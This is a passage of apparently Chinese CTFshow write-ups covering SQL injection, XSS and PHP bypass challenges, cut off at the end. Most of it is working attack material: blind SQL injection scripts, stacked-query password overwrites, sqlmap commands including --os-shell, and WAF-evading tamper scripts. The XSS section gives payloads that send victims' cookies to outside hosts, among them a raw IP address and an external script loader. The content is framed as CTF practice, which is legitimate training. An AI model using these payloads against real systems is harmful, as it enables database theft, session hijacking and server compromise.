break\n```\n\n**186**\n\n同上，开打就完了\n\n**187**\n\n针对`md5(xxx,true)`的绕过：[链接](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\n只能寻找md5\n\n所以密码输入:ffifdyop即可\n\n进行运算得出的结果为\n\n'or'6�]��!r,��b\n\n由于or后面6为真，所以语句恒为真\n\n**188**\n\nSQL比较真真离谱\n\n字符串当作数字处理\n\n即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。\n\n00即可\n\n**189**\n\n空格消失法，提示flag在api/flag.php中，必然要读取文件咯\n\n尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误\n\n布尔盲注走起\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\n进行一个布尔的盲注\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"密码错误\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\n过滤了file|into|ascii上个脚本还能用\n\n**192**\n\n过滤了file|into|ascii|ord|hex继续用\n\n**193**\n\n过滤了file|into|ascii|ord|hex|substr问题不大，换left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\n我谢谢你啊left和right都没了\n\n过滤了file|into|ascii|ord|hex|substr|char|left|right|substring，用like或者正则（其实用mid也行）\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\n堆叠改密码咯，查询语句中的username没有用引号包裹，所以查询的时候用十六进制转字符串\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\n😅\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 11.29.32.png)\n\n**197，198**\n\n一个wp脚本\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"登陆成功\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\n我选离谱方法：\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199，200**\n\n只有离谱方法能用了\n\n**201**\n\nsqlmap使用开始\n\n```\n//查库\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//查表\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//查字段 \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//查值\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\n使用POST请求，添加--data参数来设置\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\n调整请求方式，此处调整为PUT请求，记得加上Content-Type不然会变表单提交\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\n加上cookie，用--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php --cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**205**\n\n提示api鉴权，发现请求前会先对一个url进行调用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 21.53.17.png)\n\n使用如下两个参数\n\n```\n--safe-url 设置在测试目标地址前访问的安全链接\n--safe-freq 设置两次注入测试前访问安全链接的次数\n```\n\n最终命令~~悄悄换表名和列名真的可恶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\n提示SQL需要闭合，~~当我sqlmap傻是吧~~，同上即可\n\n**207**\n\n--tamper 的初体验\n\n[tamper总结](https://blog.csdn.net/whatday/article/details/54774043)\n\n使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击，--tamper=TAMPER 利用给定的脚本进行篡改注入数据，该题过滤了空格，使用自带的space2comment.py即可绕过\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\n过滤了小写的select，但是sqlmap中所有SELECT都是大写，同上即可\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\n过滤了空格，*和=，讲道理使用bluecoat.py就行，但是出不来，只能自己编写脚本替换了，将空格用%09替换，=用LIKE替换\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\n对字符串进行base64解码反转再解码，那就编码反转再编码\n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\n相比于上题多过滤了空格，加上space2commit脚本即可\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\n前两个加起来\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\n一键getshell，--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\n时间盲注开始\n\n首页发现网络流量中有select.js，查看代码\n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\n发现提交的表单中有两个变量，测试一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 14.27.34.png)\n\n测试成功，开始编写代码\n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\n单引号闭合\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64编码\n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleep不能用了啦，都ctfshow害得啦，拜托，换benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmark也🈚️了，换笛卡尔积\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\n过滤了rlike，笛卡尔积依然可用，同上即可\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\n真能滤，换left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\n时间盲注，结束\n"},{"title":"CTFshowXSS","url":"/posts/36544.html","content":"\n首先自己搭建或者找[xss测试平台](https://xss8.cc/login/)还有[另一个](https://xss.pt/)\n\n**316**\n\n```\n最简单的：\n<script>document.location.href='http://服务器IP/?x='document.cookie</script>\n```\n\n**317**\n\n过滤了script\n\n```\n<body onload=\"document.location.href='http://服务器IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\n过滤了img，使用iframe\n\n```\n<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n<BODY\tONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>\n```\n\n**319**\n\n同上即可\n\n**320**\n\n过滤了空格，script，用tab\n\n```\n<iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n```\n\n**321**\n\n过滤了img，同上\n\n**322**\n\n同上\n\n**323**\n\n过滤了iframe，使用body onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n一直到326通杀\n\n浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用`\\`，关键字双写或者编码等等\n\n\n\n存储型XSS开始\n\n**327**\n\n收件人为admin，内容为XSS即可\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n**328**\n\n构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 17.41.19.png)\n\n用超强模块吧\n\n```\n<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>\n```\n"},{"title":"CTFshowPHP特性","url":"/posts/47427.html","content":"\n**89**\n\n数组绕过\n\n```\nintval()用于获取变量的整数值\nintval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。\n语法\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\n十六进制\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//m代表多行匹配，换行符加php即可\n//cmd=%0Aphp\n```\n\n**92**\n\n同90\n\n**93**\n\n滤了16进制，使用8进制绕过\n\n```\n?num=010574\n```\n\n**94**\n\n全等用小数绕过\n\n```\n?num=4476.01\n```\n\n**95**\n\n小数点没了，用八进制加正号绕过0过滤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5强相等数组绕过\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\n分析代码\n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//只要有输入的get参数\n        $_GET = &$_POST; //就将get方法改变为post方法(修改了get方法的地址)\n        \t\t\t\t// 比如$_GET[a] = &$_POST[a]，get传a无作用，必须用POST\n    } else {\n        \"flag\";\n    }\n\n4、5行无作用\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //需要满足这个条件就可以输出flag\n        highlight_file($flag);\t\t\t//因为没有ctfshow{xxxxx}这个文件，所以会产生报错\n        \t\t\t\t\t\t\t\t//进而我们可以看到flag内容\n    } else {\n        highlight_file(__FILE__);\n    }\n构造POST\nHTTP_FLAG=flag\n再添加任意get参数即可\n```\n\n**99**\n\n```\nin_array函数如果不设置strict参数为真则进行若比较，1.php==1\npayload：n=1.php\nPOST\ncontent=一句话木马\n```\n\n**100**\n\n在PHP中，=赋值运算符优先级高于and，所以语句执行是v0=is_numeric(v1)，传入v1为数字即可\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\n反射类\n\n```php\n顾名思义，就是一个类的反射（废话么不是）\n下面是例子\nclass fuc { //定义一个类\n static\n function ec() {\n  echo '我是一个类';\n }\n}\n$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类\n$fuc=$class->newInstance(); //相当于实例化 fuc 类\n$fuc->ec(); //执行 fuc 里的方法ec\n$ec=$class->getmethod('ec'); //获取fuc 类中的ec方法\n$fuc=$class->newInstance(); //实例化\n$ec->invoke($fuc);   //执行ec 方法\n```\n\n**102**\n\n```\n先转base64再转16进制完成绕过\n```\n\n**103**\n\n同上\n\n**104**\n\n没验证直接传俩一样的呗\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\n多种操作方法\n通过die($error)输出\npayload:a=flag \nPOST: error=a\n进行的操作为\n$a=$flag;\n$error=$a;\n\n此时$a=flag{test123};$error=flag{test123};从而输出error也就是输出flag\n通过die($suces)\npayload:suces=flag&flag=\n进行的操作为\n$suces=$flag;\n\n```\n\n**106**\n\n构造数组或弱相等绕过\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_str函数，将字符串解析成多个变量\n$a=\"x=1&y=2\";\nparse_str($a,$b);\n此时$b['x']为1，$b['y']为2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\n正则表达式%00截断，正则表达式只会匹配%00之前的内容\n\n```\nstrrev()//反转字符串\nintval()//取整数\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//构造使得v1名称的类存在后面任意构造即可\n```\n\n**110**\n\n```PHP\nFilesystemIterator类的使用\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\n迭代输出当前目录下的内容\ngetcwd()//取得当前工作目录\n```\n\n**111**\n\nv1要在正则中等于ctfshow，执行的语句就是\n\n```\n$ctfshow=&$(v2的值);\nvar_dump($ctfshow);\n相当于执行了\nvar_dump($(v2的值));\n令v2=GLOBALS超全局变量即可将所有变量打印\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURL二次编码，题目中把base64滤过了，对b进行二次URL编码即可，传入php时进行一次解码，调用php伪协议时再有一次\n```\n\n**113**\n\n压缩流读取\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\n在数字前加上空格，也会被is_numeric函数认为是数字\n\ntrim函数会过滤空格以及`\\n\\r\\t\\v\\0`，但不会过滤`\\f`\n\n最终payload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格，+，.，[转换为_，但是当有特殊字符[时，后面的内容中就不会替换了\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1、cli模式（命令行）下\n第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n2、web网页模式下\n在web页模式下必须在php.ini开启register_argc_argv配置项\n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]//这里的这个参数就是GET请求中?后的内容\n$argv,$argc在web模式下不适用\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\n前面的自动转换咯\n\n**128**\n\n```\n小知识点： _()是一个函数\n_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\nget_defined_vars()函数\nget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\n目录穿越\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\n正则/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstripos返回位置从0开始，未查找到才返回false，在严格相等中不相等\n\n直接绕\n\nf=ctfshow\n\n**131**\n\n[正则溢出](https://www.laruence.com/2010/06/08/1579.html)\n\n传个超过一百万长度的字符就好啦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#python真好用\n```\n\n**132**\n\nrobots.txt进admin\n\n对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；\n\n对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。\n\n在判断这个的时候if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") 第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username 